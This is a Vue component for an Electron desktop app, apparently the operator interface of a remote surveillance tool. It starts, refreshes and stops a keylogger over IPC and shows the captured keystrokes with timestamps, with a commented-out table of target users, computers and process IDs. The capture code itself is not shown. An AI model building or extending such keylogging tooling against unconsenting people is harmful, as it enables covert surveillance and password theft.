<template>
<!--  <el-container>-->
<!--    <el-aside width="400px">-->
<!--      <el-table-->
<!--          :data="tableData"-->
<!--          border-->
<!--          style="width: 100%;height:500px">-->
<!--        <el-table-column-->
<!--            prop="User"-->
<!--            label="User">-->
<!--        </el-table-column>-->
<!--        <el-table-column-->
<!--            prop="computer"-->
<!--            label="computer">-->
<!--        </el-table-column>-->
<!--        <el-table-column-->
<!--            prop="pid"-->
<!--            label="pid">-->
<!--        </el-table-column>-->
<!--        <el-table-column-->
<!--            prop="when"-->
<!--            label="when">-->
<!--        </el-table-column>-->
<!--      </el-table>-->
<!--    </el-aside>-->
<!--    <el-main style="margin: 0;padding: 0">-->
<!--    </el-main>-->
<!--  </el-container>-->
  <div id="text"
  @dblclick="refreshKeylogger">
    <ul>
      <template v-for="keylog in $store.state.keyloggerList">
        <li style="color: cornflowerblue">{{keylog.time}}</li>
        <li style="color: #8d98a2">=======</li>
        <li style="color: white">{{keylog.input}}</li>
        <li><br></li>
      </template>
    </ul>
  </div>
</template>

<script>
import { ipcRenderer } from 'electron'

export default {
  name: 'Keyboard',

  data () {
    return {

    }
  },
  methods: {
    /**
     * @description: 请求键盘监控开始
     * @return {string} stream
     */
    requestKeylogger () {
      ipcRenderer.once('keyloggerStart', (event, stream) => {
        this.$alert('开始键盘记录', {
          confirmButtonText: '确定',
          callback: action => {
            let targetMenu = document.querySelector('#targetMenu')
            targetMenu.style.display = 'none'
          }
        })
      })
      ipcRenderer.send('requestKeylogger', 'start')
    },
    /**
     * @description: 请求键盘更新
     * @return {string} stream 新增的键盘输入
     */
    updateKeylogger () {
      ipcRenderer.once('KeyloggerUpdate', (event, stream) => {
        let date = new Date()
        let newdate = date.toLocaleString('chinese', { hour12: false })
        let set = {
          input: stream,
          time: newdate
        }
        this.$store.commit('updateKeyloggerList', set)
      })
      ipcRenderer.send('requestKeylogger', 'update')
    },
    /**
     * @description: 断开键盘更新
     * @return {string} res 断开键盘监控提示
     */
    stopKeylogger () {
      ipcRenderer.once('keyloggerStop', (event, res) => {
        alert('Vue:' + res)
      })
      ipcRenderer.send('requestKeylogger', 'stop')
    },
    refreshKeylogger () {
      this.updateKeylogger()
    }
  },
  mounted () {
    // globalBus.$on('stopKeylogger', () => {
    //   this.stopKeylogger()
    // })
    // this.requestKeylogger()
  }
}
</script>

<style scoped>
ul {
  margin: 0;
  padding: 0;
  list-style: none;
}

#text {
  font-size: 14px;
  margin: 3px;
  padding: 3px;
  background-color: #000;
  height: 400px;
  overflow-y: auto;
}
</style>
